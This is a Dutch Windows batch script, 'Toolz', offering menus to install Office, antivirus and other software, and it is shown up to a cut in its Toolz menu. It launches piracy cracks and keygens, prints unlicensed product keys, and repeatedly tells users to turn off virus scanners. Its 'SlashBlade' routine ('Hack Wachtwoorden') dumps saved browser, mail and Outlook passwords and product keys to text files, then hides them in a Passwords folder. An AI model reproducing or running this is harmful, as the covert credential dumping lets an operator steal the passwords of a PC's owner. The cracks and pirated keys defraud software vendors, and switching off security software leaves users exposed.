@ECHO OFF
::BASED ON EASY2BOOT v1.62 & Batch Programming 4.1 by ericthedreamer
set versienummer=v4.1
title Toolz %versienummer% by eric
color 0a
IF "%PROCESSOR_ARCHITECTURE%"=="x86" (set bit=x86) else (set bit=x64)
set "windows="
VER | find  " 5.1." > nul && set windows=XP
VER | find  " 5.2." > nul && set windows=XP 64-Bit or Server 2003 or Server 2003 R2 
VER | find  " 6.0." > nul && set windows=Vista or server 2008
VER | find  " 6.1." > nul && set windows=Win7 or server 2008 R2
VER | find  " 6.2." > nul && set windows=Windows 8
VER | find  " 6.3." > nul && set windows=Server 2012 R2 or Windows 8.1
VER | find  " 10.0." > nul && set windows=Windows 10 
if defined windows (
echo %windows%
) else (
echo unknown operating system
)
:ReturnToBaseLine
echo checking internet connection
Ping www.google.nl -n 1 -w 1000
if errorlevel 1 (set internet=Not connected to internet) else (set internet=Connected to internet)
color 0a
cls
echo Made By The Amazing 
echo.
echo    ____    _       ________         ___                            
echo   / __/___(_)___  /_  __/ /  ___   / _ \_______ ___ ___ _  ___ ____
echo  / _// __/ / __/   / / / _ \/ -_) / // / __/ -_) _ `/  ' \/ -_) __/
echo /___/_/ /_/\__/   /_/ /_//_/\__/ /____/_/  \__/\_,_/_/_/_/\__/_/   
echo.                                                                   
Echo     %bit% processor architecture 			versie %versienummer%
echo     %windows%
echo     %internet%
echo.
Echo   .-.     .-.     .-.     .-.     .-.     .-.     .-.     .-.     .-. 
Echo .'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `.
echo.
echo 		1. Microsoft Office installeren
echo 		2. Anti-Virus programma installeren
echo      		3. Drivers installeren
echo 		4. Overige software installeren
echo 		5. Windows activeren
echo.
echo	      Update(U)       	              Afsluiten(X)
echo.
Echo   .-.     .-.     .-.     .-.     .-.     .-.     .-.     .-.     .-. 
Echo .'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `.
echo.
echo.
set /p choice=Keuze : 
if /i "%choice%"=="1" goto Office
if /i "%choice%"=="2" goto Anti
if /i "%choice%"=="3" goto drivermenu
if /i "%choice%"=="4" goto Overig
if /i "%choice%"=="5" goto WindowsCrack
if /i "%choice%"=="u" goto updateSOFTWARE
if /i "%choice%"=="x" exit
if not "%choice%"=="" ECHO "%choice%" Is niet een geldige optie
Pause
Goto :ReturnToBaseLine
pause
:WindowsCrack
color 0b
cls
REM Check Windows Version
ver | findstr /i "5\.1\." > nul
IF %ERRORLEVEL% EQU 0 goto ver_XP
ver | findstr /i "6\.0\." > nul
IF %ERRORLEVEL% EQU 0 goto ver_Vista
ver | findstr /i "6\.1\." > nul
IF %ERRORLEVEL% EQU 0 goto ver_Win7
ver | findstr /i "6\.2\." > nul
IF %ERRORLEVEL% EQU 0 goto ver_Win8
ver | findstr /i "6\.3\." > nul
IF %ERRORLEVEL% EQU 0 goto ver_Win81
ver | findstr /i "10\.0\." > nul
IF %ERRORLEVEL% EQU 0 goto ver_Win10
goto :warn_and_exit
:ver_Win10
REM echo OS Version: Windows 10 (debug line)
echo activating windows 10
start /d "..\Microsoft Office 2013 professional plus x86 x64 NL\" KMSpico_setup.exe
goto :ReturnToBaseLine
:ver_Win81
REM echo OS Version: Windows 8.1 (debug line)
echo activating windows 8.1
start /d "..\Microsoft Office 2013 professional plus x86 x64 NL\" KMSpico_setup.exe
goto :ReturnToBaseLine
:ver_Win8
REM echo OS Version: Windows 8 (debug line)
echo activating windows 8
start /d "..\Microsoft Office 2013 professional plus x86 x64 NL\" KMSpico_setup.exe
goto :ReturnToBaseLine
:ver_Win7
REM echo OS Version: Windows 7 (debug line)
echo activating windows 7
start /d "..\ExPeRiMeNtAl\Cracks\Windows 7\Loader\Windows.7.Loader.v2.2.1-Daz\" WindowsLoader.exe
goto :ReturnToBaseLine
:ver_Vista
REM echo OS Version: Windows Vista (debug line)
echo activating windows Vista
start /d "..\ExPeRiMeNtAl\Cracks\Windows Vista\" Activation.exe
goto :ReturnToBaseLine
:ver_XP
cls
REM echo OS Version: Windows XP (debug line)
echo activating windows XP
start /d "..\ExPeRiMeNtAl\Cracks\Windows xp\AntiWPA\" AntiWPA3.cmd
goto :ReturnToBaseLine
:warn_and_exit
echo OS kan niet worden gedetecteerd
pause
goto :ReturnToBaseLine
:updateSOFTWARE
cls
echo Check www.facebook.nl/ericthedreamer voor een nieuwe versie
pause
goto :ReturnToBaseLine
:office
color 0e
cls
ECHO.
echo  %bit% ___     ___     ___     ___     ___     ___     ___     ___
echo  ___/   \___/   \___/   \___/   \___/   \___/   \___/   \___/   \___
echo /   \___/   \___/   \___/   \___/   \___/   \___/   \___/   \___/   \
echo \___/   \___/   \___/   \___/   \___/   \___/   \___/   \___/   \___/
echo /   \___/        Automatic Office Installer                 \___/   \
echo \___/                                                           \___/
echo /   \     1. Install Microsoft office 2003                      /   \
echo \___/     2. Install Microsoft office 2007                      \___/
echo /   \     3. Install Microsoft office 2010                      /   \
echo \___/     4. Install Microsoft office 2010 Home and Student     \___/
echo /   \     5. Install Microsoft office 2013                      /   \
echo \___/     6. Install Microsoft Office 2013 Home and Student     \___/
echo /   \     7. Install Microsoft Office 2013 Home and Business    /   \
echo \   /     8. Install Microsoft Office 2016 Pro                  \   /
echo /   \                                                           /   \
echo \___/    (C) ACTIVATE Only Mode                                 \___/
echo /   \                                                           /   \
echo \___/        Terug(Z)                                           \___/
echo /   \___     Afsluiten(X)                                    ___/   \
echo \___/   \___     ___     ___     ___     ___     ___     ___/   \___/
echo /   \___/   \___/   \___/   \___/   \___/   \___/   \___/   \___/   \
echo \___/   \___/   \___/   \___/   \___/   \___/   \___/   \___/   \___/
echo     \___/   \___/   \___/   \___/   \___/   \___/   \___/   \___/
echo.
set /p choice=Keuze : 
if /i "%choice%"=="1" goto :o3
if /i "%choice%"=="2" goto :o7
if /i "%choice%"=="3" goto :o10BITCHECK
if /i "%choice%"=="4" goto :o10hs
if /i "%choice%"=="5" goto :o13BITCHECK
if /i "%choice%"=="6" goto :o13hs
if /i "%choice%"=="7" goto :o13hb
if /i "%choice%"=="8" goto :016BITCHECK
if /i "%choice%"=="c" goto :CrackMenu2
if /i "%choice%"=="z" goto :ReturnToBaseLine
if /i "%choice%"=="x" exit
if not "%choice%"=="" ECHO "%choice%" Is niet een geldige optie
Pause
goto :Office
:o3
cls
start /d "..\Microsoft Office 2003 Pro NL\" SETUP.EXE
SET /P ANSWER=Wil je licentie codes voor office 2003 weergeven (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o3c) 
if /i "%ANSWER%"=="n" (goto :Office) 
goto :o3
:o3c
cls
echo.
echo GWH28-DGCMP-P6RC4-6J4MT-3HFDY
echo WFDWY-XQXJF-RHRYG-BG7RQ-BBDHM
echo WFDWY-XQXJF-RHRYG-BG7RQ-BBDHM|clip
echo.
pause
goto :Office
:o7
cls
start /d "..\Microsoft Office 2007 Enterprise NL\" SETUP.EXE
SET /P ANSWER=Wil je licentie codes voor office 2007 weergeven (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o7c) 
if /i "%ANSWER%"=="n" (goto :Office) 
goto :o7
:o7c
cls
echo.
echo JR97T-33YD4-V97F8-T8GY7-6GJBJ
echo D622B-RJQJM-BCD86-PCDMH-VYPVW
echo G99VP-T7DKH-VYW2G-X8DG7-MBVD8
echo VB48G-H6VK9-WJ93D-9R6RM-VP7GT
echo VB48G-H6VK9-WJ93D-9R6RM-VP7GT|clip
echo.
pause
goto :Office
:o10BITCHECK
cls
IF "%bit%"=="x86" (goto :o10a) else (goto :o10b)
:o10a
cls
start /d "..\Microsoft Office 2010 Pro Plus (x86 x64) NL\Office Pro Plus 2010 32 NL\" SETUP.EXE
SET /P ANSWER=Wil je de de crack voor office 2010 starten (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o10ac) 
if /i "%ANSWER%"=="n" (goto :Office) 
goto :o10a
:o10ac
start /d "..\Microsoft Office 2010 Pro Plus (x86 x64) NL\" MicrosoftToolkit.exe
goto :Office
:o10b
cls
start /d "..\Microsoft Office 2010 Pro Plus (x86 x64) NL\Office Pro Plus 2010 64 NL\" SETUP.EXE
SET /P ANSWER=Wil je de de crack voor office 2010 starten (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o10bc) 
if /i "%ANSWER%"=="n" (goto :Office) 
goto :o10b
:o10hs
cls
start /d "..\Office 2010 Student en Home install DVD\" setup.exe
SET /P ANSWER=Wil je de de crack voor office 2010 starten (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o10bc) 
if /i "%ANSWER%"=="n" (goto :Office) 
goto :o10hs
:o10bc
start /d "..\Microsoft Office 2010 Pro Plus (x86 x64) NL\" MicrosoftToolkit.exe
goto :Office
:o13BITCHECK
cls
IF "%bit%"=="x86" (goto :o13a) else (goto :o13b)
:o13a
cls
start /d "..\Microsoft Office 2013 professional plus x86 x64 NL\x86\" SETUP.EXE
SET /P ANSWER=Wilt u de Crack voor Office 2013 Starten (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o13c) 
if /i "%ANSWER%"=="n" (goto :Office) 
goto :o13a
:o13b
cls
start /d "..\Microsoft Office 2013 professional plus x86 x64 NL\x64\" SETUP.EXE
SET /P ANSWER=Wilt u de Crack voor Office 2013 Starten (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o13c) 
if /i "%ANSWER%"=="n" (goto :Office)
goto :o13b
:o13c
cls
ECHO 	 ---WAARSCHUWING--- ZET VIRUS SCANNERS UIT ---WAARSCHUWING---
ECHO 			Dit Progamma Cracked Alleen
echo.
ECHO			Windows Vista Business/N/Enterprise/N
ECHO			Windows 7 Professional/N/Enterprise/N
ECHO			Windows 8 All
ECHO			Windows 8.1 All
Echo			Office 2010/2013 
Echo			Windows Server 2008 All
Echo			Windows Server 2012
echo.
Pause
start /d "..\Microsoft Office 2013 professional plus x86 x64 NL\" KMSpico_setup.exe
goto :Office
:o13hs
cls
start /d "..\MS Office 2013 SL NL\" Setup.X86.nl-NL_HomeStudentRetail.exe
SET /P ANSWER=Wilt u de Crack voor Office 2013 Starten (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o13c) 
if /i "%ANSWER%"=="n" (goto :Office)
goto :o13hs
:o13hb
cls
start /d "..\Microsoft Office 2013 Home & Business\" Setup.X64.nl-NL_HomeBusinessRetail.exe
SET /P ANSWER=Wilt u de Crack voor Office 2013 Starten (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o13c) 
if /i "%ANSWER%"=="n" (goto :Office)
goto :o13hb
:016BITCHECK
cls
IF "%bit%"=="x86" (goto :o16a) else (goto :o16b)
:o16a
cls
start /d "..\office 2016 pro\office\" setup32.exe
SET /P ANSWER=Wilt u de Crack voor Office 2016 Starten (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o16c) 
if /i "%ANSWER%"=="n" (goto :Office)
goto :o16a
:o16b
cls
start /d "..\office 2016 pro\office\" setup64.exe
SET /P ANSWER=Wilt u de Crack voor Office 2016 Starten (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :o16c) 
if /i "%ANSWER%"=="n" (goto :Office)
goto :o16b
:o16c
cls
ECHO 	 ---WAARSCHUWING--- ZET VIRUS SCANNERS UIT ---WAARSCHUWING---
ECHO 			Dit Progamma Cracked Alleen
echo.
ECHO			Windows Vista Business/N/Enterprise/N
ECHO			Windows 7 Professional/N/Enterprise/N
ECHO			Windows 8 All
ECHO			Windows 8.1 All
Echo			Office 2010/2013 
Echo			Windows Server 2008 All
Echo			Windows Server 2012
echo.
Pause
start /d "..\office 2016 pro\KMSAuto Net 2015 v1.3.8 Portable" KMSAuto_Net.exe
goto :Office
:CrackMenu2
cls
echo   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-
echo  / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \
echo `-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'
echo.
Echo	 	OFFICE ACTIVATE MENU	
echo.
echo    1. KMSpico 10.0.4.0 STABLE
echo    2. MicrosoftToolkit 2.5.3.0 FINAL
echo    3. office 2003
echo    4. office 2007
echo    5. office 2010
echo    6. office 2013
echo.
echo    Terug(Z)
echo    Afsluiten(X)
echo.
echo   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-
echo  / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \
echo `-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'
echo.
set /p choice=Keuze : 
if /i "%choice%"=="1" goto :KMSPICO2
if /i "%choice%"=="2" goto :toolkit2
if /i "%choice%"=="3" goto :OFFICE2003key
if /i "%choice%"=="4" goto :OFFICE2007key
if /i "%choice%"=="5" goto :toolkit2
if /i "%choice%"=="6" goto :KMSPICO2
if /i "%choice%"=="7" goto :SLASHBLADE2
if /i "%choice%"=="z" goto :office
if /i "%choice%"=="x" exit
if not "%choice%"=="" ECHO "%choice%" Is niet een geldige optie
pause
goto :crackmenu2
:KMSPICO2
cls
ECHO 	 ---WAARSCHUWING--- ZET VIRUS SCANNERS UIT ---WAARSCHUWING---
ECHO 			Dit Progamma Cracked Alleen
echo.
ECHO			Windows Vista Business/N/Enterprise/N
ECHO			Windows 7 Professional/N/Enterprise/N
ECHO			Windows 8 All
ECHO			Windows 8.1 All
Echo			Office 2010/2013 
Echo			Windows Server 2008 All
Echo			Windows Server 2012
echo.
Pause
start /d "..\Microsoft Office 2013 professional plus x86 x64 NL\" KMSpico_setup.exe
goto :crackmenu2
:TOOLKIT2
cls
start /d "..\Microsoft Office 2010 Pro Plus (x86 x64) NL\" MicrosoftToolkit.exe
goto :crackmenu2
:OFFICE2003key
cls
echo.
echo GWH28-DGCMP-P6RC4-6J4MT-3HFDY
echo WFDWY-XQXJF-RHRYG-BG7RQ-BBDHM
echo WFDWY-XQXJF-RHRYG-BG7RQ-BBDHM|clip
echo.
pause
goto :crackmenu2
:OFFICE2007key
cls
echo                      !!! ZET ELKE ANTI VIRUS SCANNER UIT !!!
pause
start /d "..\Microsoft Office 2007 Enterprise NL\dUMb\" msoe2007keygen.exe
goto :crackmenu2
:SLASHBLADE2
cls
Echo          --- Waarschuwing zet uw Virus Scanner uit ---
echo.
pause
cls
start SlashBlade\ChromePass.exe /stext ChromePass.txt
start SlashBlade\mailpv.exe /stext mailpv.txt
start SlashBlade\mspass.exe /stext mspass.txt
start SlashBlade\PstPassword.exe /stext PstPassword.txt
start SlashBlade\WebBrowserPassView.exe /stext WebBrowserPassView.txt
Start SlashBlade\ProduKey.exe /stext ProduKey.txt
echo --- GELUKT! :D ---
TIMEOUT -t 15
move /-y "*.txt" "..\Passwords"
SET /P ANSWER=Wilt u de Bestanden Zichtbaar Maken(J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :unhide2) 
if /i "%ANSWER%"=="n" (goto :Hide2) 
:Hide2
attrib "..\Passwords" +h
attrib "..\Passwords\*.txt" +h
goto :TOOLZMENU
:unhide2
attrib "..\Passwords" -h
attrib "..\Passwords\*.txt" -h
goto :TOOLZMENU
:Anti
color 0c
Cls
echo %bit%.-.     .-.     .-.     .-.     .-.     .-.     .-.     .-.     .-. 
echo  .'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `.
echo (    .     .-.     .-.     .-.     .-.     .-.     .-.     .-.     .    )
echo  `.   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   `._.'   .'
echo    )    )          Automatic Anti-Virus Installer               (    (
echo  ,'   ,'                                                         `.   `.
echo (    (       1. Install AVG Internet Security 2015                 )    )
echo  `.   `.     2. Install Avast Antivirus 2015                     .'   .' 
echo    )    )    3. Install Malwarebytes                            (    (
echo  ,'   ,'     4. Install Bullguard                                `.   `.
echo (    (                                                             )    )
echo  `.   `.    (C) ACTIVATE Only Mode                                  .'   .' 
echo    )    )                                                       (    (
echo  ,'   ,'     Terug(Z)                                            `.   `.
echo (    (       Afsluiten(X)                                          )    )
echo  `.   `.                                                         .'   .' 
echo    )    )       _       _       _       _       _       _       (    (
echo  ,'   .' `.   .' `.   .' `.   .' `.   .' `.   .' `.   .' `.   .' `.   `.
echo (    '  _  `-'  _  `-'  _  `-'  _  `-'  _  `-'  _  `-'  _  `-'  _  `    )
Echo  `.   .' `.   .' `.   .' `.   .' `.   .' `.   .' `.   .' `.   .' `.   .'
Echo    `-'     `-'     `-'     `-'     `-'     `-'     `-'     `-'     `-'
echo.
set /p choice=Keuze : 
if /i "%choice%"=="1" goto :a15BITCHECK
if /i "%choice%"=="2" goto :avast15
if /i "%choice%"=="3" goto :MalwareBytes
if /i "%choice%"=="4" goto :BullG
if /i "%choice%"=="c" goto :CrackMenu1
if /i "%choice%"=="z" goto :ReturnToBaseLine
if /i "%choice%"=="x" exit
if not "%choice%"=="" ECHO "%choice%" Is niet een geldige optie
pause
Goto :Anti
:a15BITCHECK
cls
IF "%bit%"=="x86" (goto :a15a) else (goto :a15b)
:a15a
cls
start /d "..\Avg\" avg_isct_x86_all_2015_5577a8546.exe
SET /P ANSWER=Wil je licentie codes voor avg 2015 weergeven (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :a15ac) 
if /i "%ANSWER%"=="n" (goto :Anti) 
goto :a15a
:a15ac
cls
echo.
echo 8MEH-RXYFD-JUV72-8922R-F283Z-QEMBR-ACED|clip
echo 8MEH-RXYFD-JUV72-8922R-F283Z-QEMBR-ACED - Werkt en al Gekopieerd
echo.
pause
goto :Anti
:a15b
cls
start /d "..\Avg\" avg_isct_x64_all_2015_5577a8546.exe
SET /P ANSWER=Wil je licentie codes voor avg 2015 weergeven (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :a15ac) 
if /i "%ANSWER%"=="n" (goto :Anti) 
goto :a15b
:a15ac
cls
echo.
echo 8MEH-RXYFD-JUV72-8922R-F283Z-QEMBR-ACED|clip
echo 8MEH-RXYFD-JUV72-8922R-F283Z-QEMBR-ACED - Werkt en al Gekopieerd
echo.
pause
goto :Anti
:avast15
cls
start /d "..\Avast Internet Security 2015 v. 10.0.2208\" setup.exe
echo Er is een License.avastlic aanwezig. map nu openen (J/N)?
SET /P ANSWER=keuze : 
if /i "%ANSWER%"=="j" (goto :avast15KEY) 
if /i "%ANSWER%"=="n" (goto :Anti) 
goto :Anti
:avast15KEY
cls
%SystemRoot%\explorer.exe "..\Avast Internet Security 2015 v. 10.0.2208\" 
goto :Anti
:Malwarebytes 
cls
Echo ---Waarschuwing--- Sluit de crack voordat het progamma actief is.
start /d "..\Malwarebytes Anti-Malware Premium 2.0.4.1028 Final + Keys [ATOM]\" mbam-setup-2.0.4.1028.exe
SET /P ANSWER=Wil je de Keys voor Malwarebytes (J/N)?  
echo You chose: %ANSWER% 
if /i "%ANSWER%"=="j" (goto :malwarebytesc) 
if /i "%ANSWER%"=="n" (goto :Anti) 
goto :Malwarebytes 
:malwarebytesc
cls
echo.
echo ~~~~~~~~~~~~~~~~~~~~~
echo    -:[ KEYS ]:-
echo ~~~~~~~~~~~~~~~~~~~~~
echo  ID: 2WG82
echo Key: E51T-1YT6-9RAM-XE3A - automatisch gekopieerd naar clipboard
echo -----------------------
echo E51T-1YT6-9RAM-XE3A|clip
pause
goto :Anti
:BullG
cls
Echo ---Internet Verbinding Vereist---
Start /d "..\BullGuard\" BullGuardDownloader.exe
Goto :Anti
:CrackMenu1
cls
echo   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-
echo  / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \
echo `-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'
echo.
Echo	 	ANTI-VIRUS CRACK MENU
echo.
echo    1. Avast Keys
echo    2. AVG Keys
echo    3. Malwarebyte Keys
echo.    
echo    Terug(Z)
echo    Afsluiten(X)
echo.
echo   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-
echo  / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \ \ / / \
echo `-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'   `-`-'
echo.
set /p choice=Keuze : 
if /i "%choice%"=="1" goto :AVASTKEY1
if /i "%choice%"=="2" goto :AVGKEY1
if /i "%choice%"=="3" goto :MALKEY1
if /i "%choice%"=="z" goto :Anti
if /i "%choice%"=="x" exit
if not "%choice%"=="" ECHO "%choice%" Is niet een geldige optie
pause
goto :crackmenu1
:AVASTKEY1
cls
echo.
echo NIET BESCHIKBAAR GEBRUIK DE CRACK.
echo.
pause
goto :crackmenu1
:AVGKEY1
cls
echo.
echo IBY9X-ESYXT-W4BZQ-QI4WX-A9LI7-INRS3|clip
echo IBY9X-ESYXT-W4BZQ-QI4WX-A9LI7-INRS3 - Werkt en al Gekopieerd
echo.
pause
goto :crackmenu1
:MALKEY1
cls
echo.
echo ~~~~~~~~~~~~~~~~~~~~~
echo    -:[ KEYS ]:-
echo ~~~~~~~~~~~~~~~~~~~~~
echo.
echo  ID: 1EP51
echo Key: YM38-Q84W-75CA-YYQD
echo -----------------------
echo  ID: 2AI42
echo Key: PL7F-JVQJ-0TAU-7J9J
echo -----------------------
echo  ID: 3DS59
echo Key: J3PU-AJYU-2QLH-AVTT
echo -----------------------
echo  ID: 4QQ67
echo Key: 47EG-89CL-0AUG-CNW9
echo -----------------------
echo  ID: 5WT89
echo Key: 2TQL-J7UQ-VQP4-0X50
echo -----------------------
echo  ID: 6AL28
echo Key: WGTF-72DD-4033-XJ2Y
echo -----------------------
echo  ID: 7FV33
echo Key: 4Q5P-Y52X-YG38-TTXT
echo -----------------------
echo  ID: 8UU87
echo Key: YWL8-VMVH-PG1L-Y8RD
echo -----------------------
echo  ID: 9SM47
echo Key: P89C-6XQR-KLMY-DAMK
echo -----------------------
echo  ID: 1PF24
echo Key: 76PM-29MN-3EWB-VM78 - automatisch gekopieerd naar clipboard
echo -----------------------
echo 76PM-29MN-3EWB-VM78|clip
pause
goto :crackmenu1
:drivermenu
if "%internet%"=="Not connected to internet" (goto :drivermenuDOWN) else (goto :drivermenuACTIVE)
:drivermenuDOWN
cls 
echo sorry, u heeft geen internet verbinding. :(
pause
goto :ReturnToBaseLine
:drivermenuACTIVE
cls
color 0d
cls
echo.
echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo ::                      Toolz Menu                                ::
echo ::                                                                ::
echo ::                    0. PCI DATABASE                             ::
echo ::                                                                ::
echo ::      1. Acer                 10. Packard Bell                  ::
echo ::      2. Dell                 11. Panasonic                     ::
echo ::      3. Toshiba              12. Fujitsu                       ::
echo ::      4. Samsung              13. Sony                          ::
echo ::      5. Hp                                                     ::
echo ::      6. Asus                                                   ::
echo ::      7. Lenovo                                                 ::
echo ::      8. MSI                                                    ::
echo ::      9. Medion                                                 ::
echo ::                                                                ::
echo ::      Terug(Z)                                                  ::
echo ::      Afsluiten(X)                                              ::
echo ::                                                                ::
echo ::                                                                ::
echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
set /p choice=Keuze : 
if /i "%choice%"=="0" goto :pcidatabaseWhat
if /i "%choice%"=="1" goto :Acer
if /i "%choice%"=="2" goto :Dell
if /i "%choice%"=="3" goto :Toshiba
if /i "%choice%"=="4" goto :samsung
if /i "%choice%"=="5" goto :Hp
if /i "%choice%"=="6" goto :Asus
if /i "%choice%"=="7" goto :Lenovo
if /i "%choice%"=="8" goto :MSI
if /i "%choice%"=="9" goto :Medion
if /i "%choice%"=="10" goto :Packard
if /i "%choice%"=="11" goto :Panasonic
if /i "%choice%"=="12" goto :Fujitsu
if /i "%choice%"=="13" goto :Sony
if /i "%choice%"=="z" goto :ReturnToBaseLine
if /i "%choice%"=="x" exit
if not "%choice%"=="" ECHO "%choice%" Is niet een geldige optie
Pause
goto :drivermenu
:acer
cls
start http://www.acer.nl/ac/nl/NL/content/drivers
goto :drivermenu
:dell
cls
start http://www.dell.com/support/home/us/en/19/Products/?app=drivers
goto :drivermenu
:toshiba
cls
start https://www.toshiba.eu/innovation/download_drivers_bios.jsp
goto :drivermenu
:samsung
cls
start http://www.samsung.com/us/support/downloads
goto :drivermenu
:hp
cls
start http://www8.hp.com/nl/nl/drivers.html
goto :drivermenu
:Asus
cls
start http://support.asus.com/download/options.aspx?SLanguage=en&type=1
goto :drivermenu
:Lenovo
cls
start http://support.lenovo.com/us/en/products
goto :drivermenu
:MSI
cls
start http://nl.msi.com/support
goto :drivermenu
:Medion
cls
start http://www.medion.com/nl/service/download/stuurprogramma.php
goto :drivermenu
:Packard
cls
start http://www.packardbell.nl/pb/nl/NL/content/download
goto :drivermenu
:Panasonic
cls
start http://www.panasonic.com/business/documents-imaging/downloads.asp
goto :drivermenu
:Fujitsu
cls
start http://support.ts.fujitsu.com/download/index.asp?lng=nl
goto :drivermenu
:Sony
cls
start http://esupport.sony.com/p/select-system.pl?DIRECTOR=DRIVER
goto :drivermenu
:Overig
color 0d
cls
echo.
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo ::                       Overig Menu                         ::
echo ::                                                           ::
echo ::      1. Ninite Menu                                       ::
echo ::      2. Toolz Menu                                        ::
echo ::      3. Installers                                        ::
echo ::                                                           ::
echo ::      Terug(Z)                                             ::
echo ::      Afsluiten(X)                                         ::
echo ::                                                           ::
echo ::                                                           ::
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
set /p choice=Keuze : 
if /i "%choice%"=="1" goto :ninite1
if /i "%choice%"=="2" goto :TOOLZMENU
if /i "%choice%"=="3" goto :Installerz
if /i "%choice%"=="z" goto :Returntobaseline
if /i "%choice%"=="x" exit
if not "%choice%"=="" ECHO "%choice%" Is niet een geldige optie
Pause
goto :Overig
:Installerz
color 0d
cls
echo.
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo ::                    Installer Menu                         ::
echo ::                                                           ::
echo ::      1. Adblock                                           ::
echo ::      2. Winrar 5.01 (Cracked)                             ::
echo ::      3. Tweak                                             ::
echo ::      4. Windows Live Essenials                            ::
echo ::      5. Utorrent 3.4.2 ( PRO )                            ::
echo ::      6. Ccleaner 5.00 ( PRO )                             ::
echo ::      7. Unchecky                                          ::
echo ::      8. Kodi                                              ::
echo ::                                                           ::
echo ::      Terug(Z)                                             ::
echo ::      Afsluiten(X)                                         ::
echo ::                                                           ::
echo ::                                                           ::
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
set /p choice=Keuze : 
if /i "%choice%"=="1" goto :adblock
if /i "%choice%"=="2" goto :winrar1
if /i "%choice%"=="3" goto :Tweak
if /i "%choice%"=="4" goto :WLE
if /i "%choice%"=="5" goto :Utorrentsetup
if /i "%choice%"=="6" goto :cleanersetup
if /i "%choice%"=="7" goto :uncheckysetup
if /i "%choice%"=="8" goto :XBMCSETUP
if /i "%choice%"=="z" goto :Overig
if /i "%choice%"=="x" exit
if not "%choice%"=="" ECHO "%choice%" Is niet een geldige optie
Pause
goto :Installerz
:XBMCSETUP
cls
echo Icefilms addon en Navi-x addon worden op C:\XBMCADDON geplaatst.
pause
mkdir C:\XBMCADDON
xcopy ..\XBMC\Navi-X-v37_8.zip C:\XBMCADDON
xcopy ..\XBMC\repository.googlecode.anarchintosh-projects.1.0.1.zip C:\XBMCADDON
echo READY TO GO
start /d "..\XBMC\" setup.exe
goto :Installerz
:cleanersetup
cls
start /d "..\ccleaner\" setup.exe
echo Er is een Crack aanwezig. map nu openen (J/N)?
SET /P ANSWER=Keuze : 
if /i "%ANSWER%"=="j" (goto :cleanercrack) 
if /i "%ANSWER%"=="n" (goto :Installerz) 
goto :cleanersetup
:cleanercrack
cls
%SystemRoot%\explorer.exe "..\ccleaner\DLL Files\"
echo.
echo                PRO Codes
echo name :         Registered User
echo License Key:   CBB4-FJN4-EPC6-G5P6-QT4C  --- Gekopieerd naar klembord
echo CBB4-FJN4-EPC6-G5P6-QT4C|clip
echo.
echo                BUSINESS Codes
echo name :         Registered User
echo License Key:   CBB4-FJN4-EPC6-G5P6-QT4C
pause
goto :Installerz
:uncheckysetup
cls
start /d "..\unchecky\" unchecky_setup.exe
goto :installerz
:TOOLZMENU
color 0d
cls
echo.
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo ::                      Toolz Menu                           ::
echo ::                                                           ::
echo ::      1. Hirens Boot 15.2                                  ::
echo ::      2. ADW Cleaner             ( Malware Verwijderen )   ::
echo ::      3. Hack Wachtwoorden                ( Slashblade )   ::
echo ::      4. Data Recovery                                     ::
echo ::      5. Handmatige Register Fix                           ::
echo ::      6. Delete ALL Temp                                   ::
echo ::      7. WSUServer            ( Verander update server )   ::
